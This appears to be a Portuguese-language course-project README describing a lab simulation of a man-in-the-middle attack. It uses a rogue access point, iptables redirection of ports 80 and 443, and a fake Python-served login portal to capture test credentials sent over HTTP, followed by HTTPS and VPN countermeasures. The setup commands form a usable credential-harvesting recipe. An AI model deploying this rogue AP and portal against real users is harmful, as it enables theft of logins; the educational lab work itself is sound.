# SIMULAÇÃO-de-atauque-MITM-Lab: Exploração de Redes Vulneráveis

## 📑 Resumo do Projeto

Este repositório contém o trabalho avaliativo para a disciplina Redes de Computadores II, focado na simulação de um ataque Man-in-the-Middle (MITM) usando um **Ponto de Acesso Malicioso (Rogue AP)** e um **Portal Cativo (Captive Portal)**.

O objetivo principal foi demonstrar a interceptação de tráfego de rede e a coleta de credenciais enviadas sem criptografia (HTTP), cumprindo os requisitos de ambiente isolado e documentação pcap.

* **Técnica Central:** Redirecionamento de tráfego (Portas 80/443) via `iptables` para um servidor Python.
* **Resultado:** Captura bem-sucedida de CPF/Matrícula e Senha.

***
## 1.Topologia da Rede e Ambiente de Testes

O laboratório foi construído utilizando o VirtualBox com o modo de **Rede Interna** para isolamento total dos testes.

| Componente | Sistema Operacional | Configuração de Rede | Endereço IP na Rede-AP-Lab |
| :--- | :--- | :--- | :--- |
| **Kali Linux** (Atacante / Rogue AP) | Kali Linux (2025.x) | Adaptador 1: NAT (`eth0`) / Adaptador 2: Rede Interna (`eth1`) | **`192.168.10.1`** (Servidor) |
| **MV Vítima** | Windows 10 | Adaptador 1: Rede Interna (`eth1`) | **`192.168.10.68`** (Cliente DHCP) |



***

## 2.Configuração e Implementação do Ataque

### 2.1. Configuração do Rogue AP e Redes

A MV Kali foi configurada para atuar como Access Point (`hostapd`) e Servidor DHCP (`dnsmasq`) na interface `eth1`.

1.  **Configuração de Endereçamento e Roteamento:**
    ```bash
    # eth1 com IP estatico
    sudo ifconfig eth1 192.168.10.1 netmask 255.255.255.0 up
    # Habilita o encaminhamento de IP
    sudo sysctl net.ipv4.ip_forward=1 
    ```
2.  **Início dos Serviços:**
    ```bash
    sudo systemctl restart hostapd
    sudo systemctl restart dnsmasq
    ```

### 2.2. Mecanismo do Portal Cativo (Iptables + Python)

O ataque foi realizado redirecionando o tráfego da vítima para um servidor Python 3, que serviu a página de login falsa (`index.html`).

1.  **Servidor Web (Terminal 2):** Servindo a página de login e registrando os logs.
    ```bash
    sudo python3 -m http.server 8000
    ```
2.  **Regras Iptables (Redirecionamento):** As regras `PREROUTING` interceptam todo o tráfego de saída das portas 80 e 443 na rede interna (`eth1`) e o enviam para a porta 8000 local, implementando o Portal Cativo.
    ```bash
    # Regras NAT/Roteamento (Para a Internet)
    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
    # ... Outras regras FORWARD ...

    # Regras CRUCIAIS DE REDIRECIONAMENTO (Captive Portal)
    sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8000
    sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 443 -j REDIRECT --to-port 8000
    ```

***

## 3.Resultados e Prova de Exploração

A MV Vítima tentou acessar um site HTTP, foi redirecionada para o Portal Cativo e submeteu credenciais falsas, que foram capturadas pelo Wireshark.

### 3.1. Captura de Pacotes (Wireshark)

O pacote de login foi gerado usando o método **GET** (o dado é anexado à URL) para contornar a limitação do servidor Python. A captura foi realizada na interface `eth1`.

| Detalhe da Captura | Valor |
| :--- | :--- |
| **Interface de Captura** | `eth1` |
| **Filtro** | `http.request.method == GET` |
| **Frame Capturado** | **Frame 2432** |
| **IP Fonte (Vítima)** | `192.168.10.68` |

### 3.2. Prova de Exploração (Payload)

O payload da requisição HTTP comprova a interceptação dos dados em texto plano.

Fragmento do Frame 2432 (Full Request URI): `GET /?usuario=959-320-321-12&senha=senha123 HTTP/1.1`

| Dado Capturado | Valor do Campo |
| :--- | :--- |
| **CPF/Matrícula** | `959-320-321-12` |
| **Senha** | `senha123` |

* **Arquivo pcap entregue:** [captura_login_portal.pcapng](./pcaps/captura_login_portal.pcapng)

***

## 4.Análise de Segurança e Contramedidas

### 4.1. Análise da Vulnerabilidade

A exploração foi possível devido à vulnerabilidade de **transmissão de dados não criptografados (HTTP)**. O ataque MITM se posicionou entre a vítima e o destino final, interceptando o tráfego que, por padrão, é configurado para sair da rede em texto plano, garantindo a visualização das credenciais.

### 4.2. Contramedidas (Requisitos Mínimos)

Para mitigar o risco demonstrado por este ataque, recomenda-se:

| Contramedida | Efeito na Exploração | Implementação |
| :--- | :--- | :--- |
| **1. Imposição de HTTPS/SSL/TLS** | **Impede a captura.** O uso de criptografia inviabiliza a leitura dos dados pelo atacante, mesmo que o pacote seja redirecionado ou inspecionado. | Todos os serviços (incluindo portais cativos) devem forçar o uso de certificados SSL válidos e o protocolo HTTPS. |
| **2. Uso de VPN (Túnel Criptografado)** | **Impede o ataque MITM na camada de rede.** Uma VPN criptografa todo o tráfego do cliente antes que ele chegue à rede Wi-Fi não confiável. | Usuários em redes públicas devem ser instruídos a utilizar VPNs para proteger todas as camadas de comunicação. |

***

## 5.Informações do Projeto

* **Disciplina:** Redes de Computadores II
* **Instituição:** UEMG - Sistemas de Informação
* **Ano:** 2025
* **Branch Principal:** `main`

**Autores:**
* Heitor Barreto Campos dos Santos
